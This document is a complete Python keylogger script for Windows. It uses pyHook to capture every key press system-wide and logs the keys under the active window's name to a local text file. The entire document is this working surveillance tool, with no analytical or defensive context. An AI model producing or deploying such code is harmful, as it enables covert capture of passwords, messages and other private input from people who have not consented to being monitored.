import pythoncom, pyHook

check = 1

def OnKeyboardEvent(event):
    if check == 1:
        global Window
        Window = event.WindowName
        global check
        check = 0
        fopen = open('Keylogger_info_store.txt', 'w+')
        fopen.write('Window Name---> %s\nKeys --->\n%s' \
                          % (Window,event.Key))
        fopen.close()
    elif Window == event.WindowName:
        fopen = open('Keylogger_info_store.txt', 'a+')
        fopen.write('%s' \
                          % event.Key)
        fopen.close()
    else:
        Window = event.WindowName
        fopen = open('Keylogger_info_store.txt', 'a+')
        fopen.write('\nWindow Name---> %s\nKeys --->\n%s' \
                          % (Window,event.Key))
        fopen.close()


hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
